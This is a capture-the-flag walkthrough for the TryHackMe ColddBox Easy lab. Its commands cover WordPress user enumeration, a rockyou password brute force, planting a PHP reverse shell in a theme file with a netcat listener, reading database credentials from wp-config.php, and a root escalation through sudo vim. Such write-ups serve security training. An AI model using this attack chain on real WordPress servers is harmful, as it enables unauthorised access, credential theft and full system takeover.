# ColddBox Easy Walkthrough

- **Room Link**: [TryHackMe ColddBox](https://tryhackme.com/r/room/colddboxeasy)
## 1. Connect to the VPN
To begin, connect to the TryHackMe VPN:
```
sudo openvpn vpnfile.ovpn
```

## 2. Nmap Scan
Run an initial Nmap scan to discover open ports and services:
```
nmap -sC -sV <TARGET_IP>
```
The site appears to be running WordPress based on the scan results.

## 3. Username Enumeration with WPScan
Enumerate WordPress usernames using WPScan:
```
wpscan --url <TARGET_IP> --enumerate u
```
From this, we discover some usernames, including the key one: `c0ldd`.

## 4. Password Brute Force with WPScan
Next, brute force the password for the `c0ldd` user using a common wordlist (`rockyou.txt`):
```
wpscan --url <TARGET_IP> --usernames c0ldd --passwords /usr/share/dirb/wordlists/rockyou.txt
```
This reveals the login credentials:
- **Username**: `c0ldd`
- **Password**: `*********`
## 5. Logging into WordPress Admin
Using the discovered credentials, log in to the WordPress admin panel at:
```
http://<TARGET_IP>/wp-admin
```

## 6. Inserting a Reverse Shell via WordPress
Navigate to `Appearance > Editor > header.php` and add a reverse shell payload. I used the [PentestMonkey PHP Reverse Shell](https://github.com/pentestmonkey/php-reverse-shell). Customize it with your IP and port.

Run a listener using Netcat:
```
nc -nlvp 1337
```
Afterward, visit the site to trigger the reverse shell.

## 7. Spawn a Stable Shell
Once you have a reverse shell, stabilize it using Python:
```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
Then, press `Ctrl-Z` to background the shell and run the following to set the terminal properly:
```
stty raw -echo
fg
```

## 8. Retrieve Credentials from wp-config.php
While exploring the file system, check the `wp-config.php` file. It contains the database credentials:
```
define('DB_USER', 'c0ldd'); 
define('DB_PASSWORD', 'cybersecurity');
```

## 9. Gain User Access
Using the credentials found, switch to the `c0ldd` user:
```
su c0ldd
```
Now, you can retrieve the first flag:
```
cat /home/c0ldd/user.txt
```

## 10. Privilege Escalation to Root
To find ways to escalate privileges, check the `sudo` permissions:
```
sudo -l
```
You will see the following commands can be run as root:
- `/usr/bin/vim`
- `/bin/chmod`
- `/usr/bin/ftp`
Based on the [GTFOBins](https://gtfobins.github.io/) exploit suggestions, use `vim` to escalate:
```
sudo vim -c ':!/bin/sh'
```

## 11. Capture the Root Flag

Finally, with root access, retrieve the root flag:
```
cat /root/root.txt
```
